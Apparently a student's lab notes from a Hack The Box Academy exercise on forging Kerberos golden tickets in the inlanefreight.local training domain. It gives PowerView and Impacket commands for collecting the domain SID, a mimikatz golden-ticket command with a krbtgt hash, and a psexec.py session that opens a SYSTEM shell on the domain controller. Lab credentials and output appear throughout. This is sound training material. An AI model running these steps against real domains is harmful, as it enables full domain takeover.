
# From Windows


```
PS C:\Tools> Import-Module .\PowerView.ps1                                                                              
PS C:\Tools> Get-DomainSID                                                                                              
S-1-5-21-1870146311-1183348186-593267556
```



```
kerberos::golden /domain:inlanefreight.local /user:Administrator /sid:S-1-5-21-1870146311-1183348186-593267556 /rc4:c0231bd8a4a4de92fca0760c0ba9e7a6 /ptt
```


```
c:\Tools>.\mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # kerberos::golden /domain:inlanefreight.local /user:Administrator /sid:S-1-5-21-1870146311-1183348186-593267556 /rc4:c0231bd8a4a4de92fca0760c0ba9e7a6 /ptt
User      : Administrator
Domain    : inlanefreight.local (INLANEFREIGHT)
SID       : S-1-5-21-1870146311-1183348186-593267556
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: c0231bd8a4a4de92fca0760c0ba9e7a6 - rc4_hmac_nt
Lifetime  : 10/24/2025 7:49:53 AM ; 10/22/2035 7:49:53 AM ; 10/22/2035 7:49:53 AM
-> Ticket : ** Pass The Ticket **

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Golden ticket for 'Administrator @ inlanefreight.local' successfully submitted for current session

mimikatz #
```


# From Linux

Methods of SID collection

- NXC
- RID brute forcing
- recycle bin


```
kali@kali 2025-10-24 12:54:19 ~> lookupsid.py inlanefreight.local/htb-student:'HTB_@cademy_stdnt!'@10.129.205.35 -domain-sids
Impacket v0.13.0.dev0+20251021.181244.39b9d898 - Copyright Fortra, LLC and its affiliated companies 
                                                           
[*] Brute forcing SIDs at 10.129.205.35       
[*] StringBinding ncacn_np:10.129.205.35[\pipe\lsarpc]
[*] Domain SID is: S-1-5-21-1870146311-1183348186-593267556 
498: INLANEFREIGHT\Enterprise Read-only Domain Controllers (SidTypeGroup)
500: INLANEFREIGHT\Administrator (SidTypeUser)   
501: INLANEFREIGHT\Guest (SidTypeUser)         
502: INLANEFREIGHT\krbtgt (SidTypeUser)            
512: INLANEFREIGHT\Domain Admins (SidTypeGroup)                                                                       
513: INLANEFREIGHT\Domain Users (SidTypeGroup)                                                                        
514: INLANEFREIGHT\Domain Guests (SidTypeGroup)                                                                       
515: INLANEFREIGHT\Domain Computers (SidTypeGroup)
516: INLANEFREIGHT\Domain Controllers (SidTypeGroup)
517: INLANEFREIGHT\Cert Publishers (SidTypeAlias)      
518: INLANEFREIGHT\Schema Admins (SidTypeGroup)      
519: INLANEFREIGHT\Enterprise Admins (SidTypeGroup)                                                                   
520: INLANEFREIGHT\Group Policy Creator Owners (SidTypeGroup)           
521: INLANEFREIGHT\Read-only Domain Controllers (SidTypeGroup)
522: INLANEFREIGHT\Cloneable Domain Controllers (SidTypeGroup)
525: INLANEFREIGHT\Protected Users (SidTypeGroup)
526: INLANEFREIGHT\Key Admins (SidTypeGroup)  
527: INLANEFREIGHT\Enterprise Key Admins (SidTypeGroup)
553: INLANEFREIGHT\RAS and IAS Servers (SidTypeAlias)
571: INLANEFREIGHT\Allowed RODC Password Replication Group (SidTypeAlias)
572: INLANEFREIGHT\Denied RODC Password Replication Group (SidTypeAlias)
```


```
kali@kali 2025-10-24 13:14:34 ~> psexec.py INLANEFREIGHT.LOCAL/@DC01.INLANEFREIGHT.LOCAL -k -no-pass
Impacket v0.13.0.dev0+20251021.181244.39b9d898 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on DC01.INLANEFREIGHT.LOCAL.....
[*] Found writable share ADMIN$
[*] Uploading file PeBSfqjr.exe
[*] Opening SVCManager on DC01.INLANEFREIGHT.LOCAL.....
[*] Creating service KbVm on DC01.INLANEFREIGHT.LOCAL.....
[*] Starting service KbVm.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.2628]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> cd ..
```



